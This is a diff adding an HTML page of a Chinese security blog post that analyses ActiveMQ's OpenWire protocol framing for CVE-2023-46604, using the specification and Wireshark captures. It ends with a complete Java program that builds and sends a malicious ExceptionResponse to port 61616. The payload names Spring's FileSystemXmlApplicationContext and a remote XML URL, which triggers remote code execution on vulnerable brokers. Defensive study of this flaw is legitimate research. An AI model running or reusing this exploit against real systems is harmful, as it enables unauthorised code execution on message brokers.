@@ -1,0 +1,749 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.ico">
+  <link rel="icon" href="/img/avatar.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pacemrc">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="OpenWire协议什么是OpenWire协议？官网介绍：https:&#x2F;&#x2F;activemq.apache.org&#x2F;openwire-version-2-specification OpenWire is used to marshal objects to byte arrays and back. We will refer to the marshaled objects as command">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OpenWire协议分析">
+<meta property="og:url" content="https://pacemrc.github.io/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/OpenWire%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="白日梦想家">
+<meta property="og:description" content="OpenWire协议什么是OpenWire协议？官网介绍：https:&#x2F;&#x2F;activemq.apache.org&#x2F;openwire-version-2-specification OpenWire is used to marshal objects to byte arrays and back. We will refer to the marshaled objects as command">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127102758450.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127103326654.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127103431705.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127103821178.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127103835136.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127110341012.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127100853602.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127101105566.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127111810305.png">
+<meta property="article:published_time" content="2024-01-19T09:17:10.000Z">
+<meta property="article:modified_time" content="2025-11-26T11:02:09.743Z">
+<meta property="article:author" content="pacemrc">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127102758450.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>OpenWire协议分析 - 白日梦想家</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pacemrc.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>白日梦想家</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/category.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="OpenWire协议分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        pacemrc
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-19 17:17" pubdate>
+          2024年1月19日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          841 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          8 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-10 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">OpenWire协议分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="OpenWire协议"><a href="#OpenWire协议" class="headerlink" title="OpenWire协议"></a>OpenWire协议</h1><h2 id="什么是OpenWire协议？"><a href="#什么是OpenWire协议？" class="headerlink" title="什么是OpenWire协议？"></a>什么是OpenWire协议？</h2><p>官网介绍：<a target="_blank" rel="noopener" href="https://activemq.apache.org/openwire-version-2-specification">https://activemq.apache.org/openwire-version-2-specification</a></p>
+<div class="code-wrapper"><pre><code class="hljs applescript">OpenWire <span class="hljs-keyword">is</span> used <span class="hljs-keyword">to</span> marshal objects <span class="hljs-keyword">to</span> byte arrays <span class="hljs-keyword">and</span> <span class="hljs-keyword">back</span>. We will refer <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> marshaled objects <span class="hljs-keyword">as</span> commands.</code></pre></div>
+
+<p>根据描述，openwire协议用于对象与字节数组之间的转化，它把转化后的对象成为命令。</p>
+<h2 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h2><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127102758450.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据描述，可知当SizePrefixDisabled选择为false值时，编码后对象即命令的编码有size，type，command-specific-fields，size根据描述大概是整个命令的长度，type字段是命令类型的标识符，command-specific-fields字段是一些根据命令类型不同而不同的其他字段。</p>
+<p>往下看给出了每个命令类型对应的命令标识符</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127103326654.png" srcset="/img/loading.gif" lazyload></p>
+<p>继续往下看给出了命令字段（对象属性）的编码格式</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127103431705.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Throwable-Type-Encoding"><a href="#Throwable-Type-Encoding" class="headerlink" title="Throwable Type Encoding"></a>Throwable Type Encoding</h3><p>因CVE-2023-46604漏洞发送的是Throwable类型数据，这里主要分析该类型</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127103821178.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127103835136.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据描述可知，当not-null字段为1时，throwable数据不为空，exception-name表示异常类的名字，message表示异常的提示消息，当StackTraceEnabled值为true时，才有其他字段，经分析该字段默认为false</p>
+<h3 id="String-Type-Encoding"><a href="#String-Type-Encoding" class="headerlink" title="String Type Encoding"></a>String Type Encoding</h3><p>由于exception-name和message字段的值类型为string类型，openwire对string类型数据也需要进行编码</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127110341012.png" srcset="/img/loading.gif" lazyload></p>
+<p>可知有三个字段not-null，size，encoded-string，not-null字段表示字段值不为空，size为string长度 ，encoded-string为编码后的内容</p>
+<h1 id="wireshark协议解析"><a href="#wireshark协议解析" class="headerlink" title="wireshark协议解析"></a>wireshark协议解析</h1><p>使用wireshark抓取openwire协议的流量观察解析的字段</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127100853602.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据wireshark的协议解析，有以下字段，点击数据包的字段名称在数据体内即可显示字段的大小</p>
+<h3 id="协议头"><a href="#协议头" class="headerlink" title="协议头"></a>协议头</h3><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">openwire</span>.length：<span class="hljs-number">4</span>个字节
+<span class="hljs-attribute">openwire</span>.command：<span class="hljs-number">1</span>个字节
+<span class="hljs-attribute">openwire</span>.command.id：<span class="hljs-number">4</span>个字节
+<span class="hljs-attribute">openwire</span>.command.response_required：<span class="hljs-number">1</span>个字节
+<span class="hljs-attribute">openwire</span>.response.correlationid：<span class="hljs-number">4</span>个字节</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127101105566.png" srcset="/img/loading.gif" lazyload></p>
+<div class="code-wrapper"><pre><code class="hljs pgsql">openwire.exceptionresponse.<span class="hljs-keyword">exception</span>：可变长
+<span class="hljs-keyword">not</span>-<span class="hljs-keyword">null</span>字段，<span class="hljs-number">1</span>个字节，表示openwire.exceptionresponse.<span class="hljs-keyword">exception</span>是否为空
+<span class="hljs-keyword">not</span>-<span class="hljs-keyword">null</span>字段，<span class="hljs-number">1</span>个字节，表示<span class="hljs-keyword">exception</span>-<span class="hljs-type">name</span>字段是否为空
+size字段，<span class="hljs-number">2</span>个字节，表示<span class="hljs-keyword">exception</span>-<span class="hljs-type">name</span>字段值的长度
+encoded-string，可变长，表示<span class="hljs-keyword">exception</span>-<span class="hljs-type">name</span>字段的值
+<span class="hljs-keyword">not</span>-<span class="hljs-keyword">null</span>字段，<span class="hljs-number">1</span>个字节，表示message字段是否为空
+size字段，<span class="hljs-number">2</span>个字节，表示message字段值的长度
+encoded-string，可变长，表示message字段的值</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127111810305.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="协议构造"><a href="#协议构造" class="headerlink" title="协议构造"></a>协议构造</h1><p>结合官网协议描述和wireshark协议解析，可得出以下构造代码</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cve;
+<span class="hljs-keyword">import</span> javax.jms.*;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.io.OutputStream;
+<span class="hljs-keyword">import</span> java.net.Socket;
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * payload构造思路，构造标准的openwire协议</span>
+<span class="hljs-comment"> * 官方协议地址：&lt;https://activemq.apache.org/openwire-version-2-specification&gt;</span>
+<span class="hljs-comment"> *</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CVE_2023_46604_2</span> &#123;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] byteMerger(<span class="hljs-type">byte</span>[] bt1, <span class="hljs-type">byte</span>[] bt2)&#123;
+        <span class="hljs-type">byte</span>[] bt3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bt1.length + bt2.length];
+        System.arraycopy(bt1, <span class="hljs-number">0</span>, bt3, <span class="hljs-number">0</span>, bt1.length);
+        System.arraycopy(bt2, <span class="hljs-number">0</span>, bt3, bt1.length, bt2.length);
+        <span class="hljs-keyword">return</span> bt3;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> &#123;
+        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();
+        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; bytes.length; i++) &#123;
+            <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> Integer.toHexString(bytes[i] &amp; <span class="hljs-number">0xFF</span>);
+            <span class="hljs-keyword">if</span>(hex.length() &lt; <span class="hljs-number">2</span>)&#123;
+                sb.append(<span class="hljs-number">0</span>);
+            &#125;
+            sb.append(hex);
+        &#125;
+        <span class="hljs-keyword">return</span> sb.toString();
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> JMSException, IOException &#123;
+
+        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;10.58.120.201&quot;</span>;
+        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">61616</span>;
+        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(host, port);
+        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> socket.getOutputStream();
+
+        <span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[] &#123;<span class="hljs-number">0x1f</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>&#125;;
+        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.springframework.context.support.FileSystemXmlApplicationContext&quot;</span>;
+        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;http://127.0.0.1/calc.xml&gt;&quot;</span>;
+        <span class="hljs-type">byte</span>[] ClassNameBytes = className.getBytes();
+        <span class="hljs-type">byte</span>[] messageBytes = message.getBytes();
+        <span class="hljs-type">byte</span>[] notnull = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">0x01</span>&#125;;
+        <span class="hljs-type">byte</span>[] classLength = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">0x00</span>,(<span class="hljs-type">byte</span>)(ClassNameBytes.length)&#125;;
+        <span class="hljs-type">byte</span>[] NamePartbytes = byteMerger(classLength, ClassNameBytes);
+        <span class="hljs-type">byte</span>[] partOne = byteMerger(notnull,NamePartbytes);
+        <span class="hljs-type">byte</span>[] messageLength = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">0x00</span>,(<span class="hljs-type">byte</span>)(messageBytes.length)&#125;;
+        <span class="hljs-type">byte</span>[] messagePartBytes = byteMerger(messageLength, messageBytes);
+        <span class="hljs-type">byte</span>[] partTwo = byteMerger(notnull, messagePartBytes);
+        <span class="hljs-type">byte</span>[] body =byteMerger(notnull,byteMerger(partOne,partTwo));
+        <span class="hljs-type">byte</span>[] packagelength = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,(<span class="hljs-type">byte</span>)((header.length + body.length) / <span class="hljs-number">2</span> )&#125;;
+        <span class="hljs-type">byte</span>[] payload = byteMerger(packagelength, byteMerger(header, body));
+
+        System.out.println(<span class="hljs-string">&quot;[*] send payload :&quot;</span> + bytesToHex(payload));
+        outputStream.write(payload);
+        outputStream.flush();
+        outputStream.close();
+    &#125;
+&#125;</code></pre></div>
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>官网介绍：<a target="_blank" rel="noopener" href="https://activemq.apache.org/openwire-version-2-specification">https://activemq.apache.org/openwire-version-2-specification</a></p>
+<p>协议构造：<a target="_blank" rel="noopener" href="https://github.com/X1r0z/ActiveMQ-RCE">https://github.com/X1r0z/ActiveMQ-RCE</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Jspxcms%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/" title="Jspxcms审计">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Jspxcms审计</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/jshERP%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/" title="jshERP审计">
+                        <span class="hidden-mobile">jshERP审计</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
